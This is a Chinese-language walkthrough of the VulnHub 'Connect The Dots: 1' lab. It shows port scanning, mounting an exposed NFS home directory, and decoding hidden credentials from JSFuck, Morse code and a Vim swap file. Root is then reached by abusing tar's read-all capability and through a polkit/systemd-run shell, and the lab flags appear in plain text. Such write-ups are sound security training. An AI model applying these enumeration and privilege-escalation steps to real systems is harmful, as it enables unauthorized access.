# Connect The Dots: 1

2024-6-11 https://www.vulnhub.com/entry/connect-the-dots-1,384/

difficulty: Beginner-Intermediate

## IP

192.168.5.35

## Scan

Open Port -> 21,80,111,2049,7822,33373,53341,55305,55413

```
PORT      STATE SERVICE  VERSION
21/tcp    open  ftp      vsftpd 2.0.8 or later
80/tcp    open  http     Apache httpd 2.4.38 ((Debian))
|_http-title: Landing Page
|_http-server-header: Apache/2.4.38 (Debian)
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      35567/udp6  mountd
|   100005  1,2,3      42073/tcp6  mountd
|   100005  1,2,3      53341/tcp   mountd
|   100005  1,2,3      58299/udp   mountd
|   100021  1,3,4      33373/tcp   nlockmgr
|   100021  1,3,4      41697/tcp6  nlockmgr
|   100021  1,3,4      53968/udp6  nlockmgr
|   100021  1,3,4      55869/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs_acl  3 (RPC #100227)
7822/tcp  open  ssh      OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey:
|   2048 384fe876b4b704650976dd234eb569ed (RSA)
|   256 acd2a60f4b4177df06f011d592399feb (ECDSA)
|_  256 93f7786fcce8d48d754bc2bc134bf0dd (ED25519)
33373/tcp open  nlockmgr 1-4 (RPC #100021)
53341/tcp open  mountd   1-3 (RPC #100005)
55305/tcp open  mountd   1-3 (RPC #100005)
55413/tcp open  mountd   1-3 (RPC #100005)
```

有 ssh、web、nfs 等服务。先看看 nfs 会不会暴露什么映射信息:

```
showmount -e 192.168.5.35
Export list for 192.168.5.35:
/home/morris *
```

mount 到 kali 上:

```
mkdir -p /tmp/nfs
sudo mount -t nfs -o rw,vers=3 192.168.5.35:/home/morris /tmp/nfs
```

进入 /tmp/nfs 后，发现.ssh 文件夹，里面有公钥和私钥对。
id_rsa.pub 发现用户名 morris，尝试用私钥进行登陆，但是不能成功：

```
ssh -i id_rsa morris@192.168.5.35 -p 7822
```

访问 http://192.168.5.35/，显示了一些文字信息和图片。

使用 gobuster 进行扫描：

```
gobuster -t 32 dir -u http://192.168.5.35/ -k -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,txt,html,rar,zip,sql -e
```

http://192.168.5.35/hits.txt : Remember! Keep your enumeration game strong!

http://192.168.5.35/backups.html 显示的是一个视频。

http://192.168.5.35/mysite 显示了一个列目录，有一个登陆页面，但是没发现登陆点。查看列目录中的其他文件，发现一个 http://192.168.5.35/mysite/bootstrap.min.cs 文件，内容像是 jsfuck，进行解码看看什么内容：

```
alert("You're smart enough to understand me. Here's your secret, TryToGuessThisNorris@2k19")
```

可能是 morris 的 ssh 密码，尝试登陆，不对。

重新看最开始的首页链接，里面说名字的首字母不一样，一个是 M 另一个是 N,并且上面的密码中也有一个 Norris，是否可能还有一个 norris 的用户，尝试使用 ssh 进行登陆。登陆成功 norris:TryToGuessThisNorris@2k19

发现了 user flag:

```
norris@sirrom:~$ cat user.txt
2c2836a138c0e7f7529aa0764a6414d0
```

发现 norris 中有一个 ftp 文件夹，里面有一些 bak 备份文件。查看 game.jpg.bak，发现跟主页上的文件大小不一样，很有可能有信息。exiftool 发现 Comment 中摩尔斯码：

```
.... . -.-- ....... -. --- .-. .-. .. ... --..-- ....... -.-- --- ..- .----. ...- . ....... -- .- -.. . ....... - .... .. ... ....... ..-. .- .-. .-.-.- ....... ..-. .- .-. ....... ..-. .- .-. ....... ..-. .-. --- -- ....... .... . .- ...- . -. ....... .-- .- -. -. .- ....... ... . . ....... .... . .-.. .-.. ....... -. --- .-- ..--.. ....... .... .- .... .- ....... -.-- --- ..- ....... ... ..- .-. . .-.. -.-- ....... -- .. ... ... . -.. ....... -- . --..-- ....... -.. .. -.. -. .----. - ....... -.-- --- ..- ..--.. ....... --- .... ....... -.. .- -- -. ....... -- -.-- ....... -... .- - - . .-. -.-- ....... .. ... ....... .- -... --- ..- - ....... - --- ....... -.. .. . ....... .- -. -.. ....... .. ....... .- -- ....... ..- -. .- -... .-.. . ....... - --- ....... ..-. .. -. -.. ....... -- -.-- ....... -.-. .... .- .-. --. . .-. ....... ... --- ....... --.- ..- .. -.-. -.- .-.. -.-- ....... .-.. . .- ...- .. -. --. ....... .- ....... .... .. -. - ....... .. -. ....... .... . .-. . ....... -... . ..-. --- .-. . ....... - .... .. ... ....... ... -.-- ... - . -- ....... ... .... ..- - ... ....... -.. --- .-- -. ....... .- ..- - --- -- .- - .. -.-. .- .-.. .-.. -.-- .-.-.- ....... .. ....... .- -- ....... ... .- ...- .. -. --. ....... - .... . ....... --. .- - . .-- .- -.-- ....... - --- ....... -- -.-- ....... -.. ..- -. --. . --- -. ....... .. -. ....... .- ....... .----. ... . -.-. .-. . - ..-. .. .-.. . .----. ....... .-- .... .. -.-. .... ....... .. ... ....... .--. ..- -... .-.. .. -.-. .-.. -.-- ....... .- -.-. -.-. . ... ... .. -... .-.. . .-.-.-
```

进行解码：

```
HEY NORRIS, YOU'VE MADE THIS FAR. FAR FAR FROM HEAVEN WANNA SEE HELL NOW? HAHA YOU SURELY MISSED ME, DIDN'T YOU? OH DAMN MY BATTERY IS ABOUT TO DIE AND I AM UNABLE TO FIND MY CHARGER SO QUICKLY LEAVING A HINT IN HERE BEFORE THIS SYSTEM SHUTS DOWN AUTOMATICALLY. I AM SAVING THE GATEWAY TO MY DUNGEON IN A 'SECRETFILE' WHICH IS PUBLICLY ACCESSIBLE.
```

提示有一个 SECRETFILE 文件

```
norris@sirrom:~/ftp/files$ find / -name secretfile 2>/dev/null
/var/www/html/secretfile

norris@sirrom:/var/www/html$ cat secretfile
I see you're here for the password. Holy Moly! Battery is dying !! Mentioning below for reference.
```

发现隐藏文件 .secretfile.swp 但是需要 www-data 的权限才能读取，通过浏览器访问，保存在 kali 上。

```
file secretfile.swp
secretfile.swp: Vim swap file, version 8.1, pid 4983, user root, host sirrom, file /var/www/html/secretfile, modified

strings secretfile.swp
b0VIM 8.1
root
sirrom
/var/www/html/secretfile
U3210
#"!
blehguessme090
I see you're here for the password. Holy Moly! Battery is dying !! Mentioning below for reference..
```

sirrom 、U3210、blehguessme090 可能为密码，系统上还有另外 2 个用户 root 和 morris 看看是哪个用户的，经过 su，发现 morris 的密码是 blehguessme090

继续进行系统枚举，找到提权到 root 的路径。

getcap 发现 /usr/bin/tar = cap_dac_read_search+ep 可以打包读取敏文文件：

```
morris@sirrom:/etc$ /usr/sbin/getcap -r / 2>/dev/null
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/tar = cap_dac_read_search+ep
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/bin/ping = cap_net_raw+ep

norris@sirrom:/var/www/html$ ls -al /usr/bin/tar
-r-xr-x--- 1 root norris 445560 Apr 23  2019 /usr/bin/tar

cd /tmp
tar -czf /tmp/root.tar.gz /root
cd /tmp
tar -zxf root.tar.gz

norris@sirrom:/tmp/root$ cat root.txt
8fc9376d961670ca10be270d52eda423
```

必须切换到 norris 来执行 tar。最终得到了 root flag

其他提权到 root 的路径都没有找到，使用 linpeas 发现 /usr/lib/policykit-1/polkit-agent-helper-1，尝试用这个看看能不能提权到 root:

https://learn.redhat.com/t5/Platform-Linux/Another-interesting-local-privilege-escalation-vulnerability/td-p/2872

```
systemd-run --shell
输入密码
root@sirrom:/# id
uid=0(root) gid=0(root) groups=0(root)
```
